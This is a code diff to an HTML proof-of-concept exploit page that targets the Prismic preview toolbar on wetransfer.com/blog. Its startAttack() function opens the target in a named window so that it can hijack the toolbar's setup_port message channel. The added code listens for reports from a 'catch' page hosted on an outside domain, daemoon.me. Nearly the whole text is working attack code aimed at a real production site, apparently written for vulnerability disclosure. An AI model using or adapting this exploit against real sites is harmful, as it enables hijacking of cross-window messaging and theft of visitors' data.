@@ -33,7 +33,7 @@
 </p>
 
 <label for="target">Target URL (wetransfer.com/blog has Prismic toolbar, no framing restrictions):</label>
-<input id="target" type="text" value="https://frontsite-nextjs.wetransfer.net/blog">
+<input id="target" type="text" value="https://wetransfer.com/blog">
 
 <label for="catch">Catch page URL (host poc-prismic-catch.html):</label>
 <input id="catch" type="text" value="https://daemoon.me/demo/poc-prismic-catch.html">
@@ -52,6 +52,13 @@ function log(msg, cls) {
   div.scrollTop = div.scrollHeight;
 }
 
+// Listen for status reports from catch page
+window.addEventListener('message', function(e) {
+  if (e.data && e.data.type === 'catch_status') {
+    log('[CATCH] ' + e.data.msg, 'warn');
+  }
+});
+
 function startAttack() {
   var TARGET = document.getElementById('target').value;
   var CATCH_URL = document.getElementById('catch').value;
@@ -63,7 +70,7 @@ function startAttack() {
   // Step 1: window.open targets the empty named iframe, triggers FIRST load
   // CRITICAL: iframe must have NO src= so prismic.js hasn't run yet.
   // If iframe was pre-loaded, setup_port would already be consumed before we can hijack.
-  var x = window.open(TARGET, "victim", "width=800,height=600");
+  var x = window.open(TARGET, "victim");
   if (!x) {
     log('Failed to get window reference.', 'error');
     return;
